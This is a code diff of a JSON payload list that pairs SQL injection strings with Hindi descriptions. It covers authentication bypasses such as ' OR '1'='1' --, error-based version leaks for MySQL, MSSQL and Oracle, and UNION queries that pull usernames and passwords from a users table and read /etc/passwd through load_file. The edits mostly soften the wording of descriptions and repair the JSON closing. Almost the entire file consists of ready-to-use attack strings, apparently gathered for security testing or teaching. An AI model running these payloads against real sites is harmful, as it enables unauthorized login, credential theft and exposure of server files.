@@ -16,17 +16,16 @@
     { "id": 11, "category": "Auth Bypass", "payload": "HI' OR '1'='1", "description": "गलत यूजरनेम डालने पर भी बैकएंड पर 'OR' कंडीशन को सच साबित करता है।" },
     { "id": 12, "category": "Auth Bypass", "payload": "' OR '1'='1' --", "description": "स्ट्रिंग क्लोजर के साथ डबल-डैश कमेंट का उपयोग करके लॉगिन बाईपास।" },
     { "id": 13, "category": "Auth Bypass", "payload": "' OR 1=1 LIMIT 1 --", "description": "डेटाबेस से केवल पहला (एडमिन) रिकॉर्ड लाकर लॉगिन करने पर मजबूर करता है।" },
-    { "id": 14, "category": "Auth Bypass", "payload": "admin' OR '1'='1", "description": "एडमिन यूजरनेम और स्ट्रिंग लॉजिक को मिलाकर लॉगिन फ़िल्टर को तोड़ता है।" },
+    { "id": 14, "category": "Auth Bypass", "payload": "admin' OR '1'='1", "description": "एडमिन यूजरनेम and स्ट्रिंग लॉजिक को मिलाकर लॉगिन फ़िल्टर को तोड़ता है।" },
     { "id": 15, "category": "Auth Bypass", "payload": "' OR a=a --", "description": "संख्याओं की जगह अक्षरों की तुलना (a=a) का उपयोग करके सुरक्षा बाईपास।" },
     { "id": 16, "category": "Auth Bypass", "payload": "' OR 'a'='a'", "description": "पूरी तरह से कोटेड अक्षरों का उपयोग करके शुरुआती सुरक्षा फिल्टर्स को धोखा देता है।" },
     { "id": 17, "category": "Auth Bypass", "payload": "') OR '1'='1'--", "description": "एकल ब्रैकेट सिंटैक्स को बंद करके लॉगिन लॉजिक को हाइजैक करता है।" },
     { "id": 18, "category": "Auth Bypass", "payload": "')) OR ('1'='1'--", "description": "जटिल वेब एप्लिकेशन्स के नेस्टेड डबल ब्रैकेट सिंटैक्स को बंद करने के लिए।" },
     { "id": 19, "category": "Auth Bypass", "payload": "'=='' --", "description": "कमजोर कोडिंग या विशिष्ट हाइब्रिड SQL इंजन के लॉजिक का फायदा उठाता है।" },
     { "id": 20, "category": "Auth Bypass", "payload": "' OR 1=1- -", "description": "स्पेस हटाने वाले सुरक्षा फिल्टर्स को चकमा देने के लिए डैशेस में बदलाव।" },
-
     { "id": 21, "category": "Error-Based", "payload": "' OR extractvalue(1,concat(0x3a,version()))--", "description": "MySQL में extractvalue XML एरर पैदा करके डेटाबेस वर्जन स्क्रीन पर दिखाता है।" },
     { "id": 22, "category": "Error-Based", "payload": "\" AND updatexml(1,concat(0x3a,version()),1)--", "description": "updatexml फ़ंक्शन के जरिए त्रुटि संदेश के अंदर संवेदनशील जानकारी लीक करता है।" },
-    { "id": 23, "category": "Error-Based", "payload": "' OR convert(int,@@version)--", "description": "MSSQL में स्ट्रिंग को संख्या में बदलते समय एरर में वर्जन नाम दिखाता है।" },
+    { "id": 23, "category": "Error-Based", "payload": "' OR convert(int,@@version)--", "description": "MSSQL में HTML या स्ट्रिंग को संख्या में बदलते समय एरर में वर्जन नाम दिखाता है।" },
     { "id": 24, "category": "Error-Based", "payload": "' OR CAST(@@VERSION AS INT)--", "description": "Microsoft SQL Server पर CAST फंक्शन की मदद से सिस्टम पाथ लीक करवाता है।" },
     { "id": 25, "category": "Error-Based", "payload": "OR 1=UTL_INADDR.GET_HOST_ADDRESS('127.0.0.1')--", "description": "Oracle नेटवर्क पैकेज एरर का फायदा उठाकर डेटा को त्रुटि संदेशों में छुपाकर लाता है।" },
     { "id": 26, "category": "Error-Based", "payload": "AND expert_mode()--", "description": "गलत तरीके से कॉन्फ़िगर किए गए नेटिव फ़ंक्शंस को कॉल करके एरर दिखाता है।" },
@@ -37,14 +36,13 @@
     { "id": 31, "category": "Error-Based", "payload": "ctxsys.drithsx.sn(1,(SELECT user FROM dual))--", "description": "Oracle टेक्स्ट इंडेक्सिंग फ़ंक्शन की कमियों का उपयोग करके सिस्टम मैप दिखाता है।" },
     { "id": 32, "category": "Error-Based", "payload": "dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual))--", "description": "Oracle यूटिलिटी हैश फंक्शंस के जरिए रनटाइम क्वेरी एरर पैदा करता है।" },
     { "id": 33, "category": "Error-Based", "payload": "' UNION SELECT 1/0--", "description": "संख्या को शून्य से विभाजित (Division by Zero) करके सर्वर की त्रुटि जांचता है।" },
-    { "id": 34, "category": "Error-Based", "payload": "'; EXEC rpc_init--", "description": "MSSQL पर रिमोट प्रोसीजर कॉल शुरू करके मल्टीपल क्वेरी रन होने की जांच करता है।" },
+    { "id": 34, "category": "Error-Based", "payload": "'; EXEC rpc_init--", "description": "MSSQL पर रिमोट प्रोसीजर कॉल शुरू करके मल्टिपल क्वेरी रन होने की जांच करता है।" },
     { "id": 35, "category": "Error-Based", "payload": "' AND ST_LatFromGeoHash(version())--", "description": "MySQL के विशेष जियोग्राफिक (स्थान-आधारित) फंक्शन की मदद से डेटा लीक करता है।" },
     { "id": 36, "category": "Error-Based", "payload": "' AND GTID_SUBSET(version(),1)--", "description": "MySQL 5.6+ वर्जन्स में रेप्लिकेशन फंक्शन के जरिए वर्जन की जानकारी निकालता है।" },
     { "id": 37, "category": "Error-Based", "payload": "' AND ST_LongFromGeoHash(version())--", "description": "जियोग्राफिक कोऑर्डिनेट फंक्शंस का उपयोग करके डेटाबेस एरर ट्रिगर करता है।" },
     { "id": 38, "category": "Error-Based", "payload": "' AND MultiPoint((SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--", "description": "पुराने MySQL डेटाबेस वर्जन्स में ज्योमेट्री ऑब्जेक्ट सिंटैक्स एरर पैदा करता है।" },
     { "id": 39, "category": "Error-Based", "payload": "AND (SELECT 1 FROM (SELECT(JSON_ARRAYAGG(version())))x)--", "description": "JSON एरे फॉर्मेटिंग स्क्रिप्ट्स का उपयोग करके डेटा लीक एरर पैदा करता है।" },
     { "id": 40, "category": "Error-Based", "payload": "' AND polygon((SELECT * FROM(SELECT user())x))--", "description": "पॉलीगॉन डेटा मैपिंग एरर के माध्यम से एक्टिव यूजर का नाम स्क्रीन पर लाता है।" },
-
     { "id": 41, "category": "Union-Based", "payload": "' UNION SELECT NULL--", "description": "यह जांचता है कि असली क्वैरी में डेटा टाइप की गलती के बिना सिर्फ 1 कॉलम है या नहीं।" },
     { "id": 42, "category": "Union-Based", "payload": "' UNION SELECT NULL,NULL--", "description": "डेटाबेस स्ट्रक्चर में ठीक दो कॉलम्स की मौजूदगी की पुष्टि करने के लिए।" },
     { "id": 43, "category": "Union-Based", "payload": "' UNION SELECT NULL,NULL,NULL--", "description": "एक्टिव आउटपुट टेबल में कुल तीन कॉलम्स की जांच करने के लिए पेलोड।" },
@@ -54,7 +52,8 @@
     { "id": 47, "category": "Union-Based", "payload": "' UNION SELECT NULL,version(),NULL--", "description": "वेबसाइट के दूसरे दिखने वाले कॉलम एलिमेंट में डेटाबेस इंजन की जानकारी दिखाता है।" },
     { "id": 48, "category": "Union-Based", "payload": "' UNION SELECT table_name,null FROM information_schema.tables--", "description": "MySQL की जानकारी स्टोर करने वाली मुख्य जगह से सभी टेबल्स के नाम निकालता है।" },
     { "id": 49, "category": "Union-Based", "payload": "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--", "description": "महत्वपूर्ण 'users' टेबल के अंदर मौजूद सभी कॉलम्स के असली हेडर ढूंढता है।" },
-    { "id": 50, "category": "Union-Based", "payload": "' UNION SELECT username, password FROM users--", "description": "असुरक्षित वेबसाइटों की 'users' टेबल से सीधे यूजरनेम और पासवर्ड चोरी करता है।" },
+    { "id": 50, "category": "Union-Based", "payload": "' UNION SELECT username, password FROM users--", "description": "असुरक्षित वेबसाइटों की 'users' टेबल से सीधे यूजरनेम और पासवर्ड दिखाता है।" },
     { "id": 51, "category": "Union-Based", "payload": "' UNION SELECT user(),database()--", "description": "एक ही बार में वर्तमान लॉगिन यूजर और एक्टिव डेटाबेस का नाम दिखाता है।" },
-    { "id": 52, "category": "Union-Based", "payload": "' UNION SELECT null, load_file('/etc/passwd')--", "description": "लोकल फाइल इन्क्लूजन (LFI) के जरिए लिनक्स सर्वर की अंदरूनी फाइलें पढ़ता है।" },]
-    {
+    { "id": 52, "category": "Union-Based", "payload": "' UNION SELECT null, load_file('/etc/passwd')--", "description": "लोकल फाइल रीडर क्षमता का उपयोग करके सर्वर की अंदरूनी फाइलें पढ़ने की जांच करता है।" }
+  ]
+}
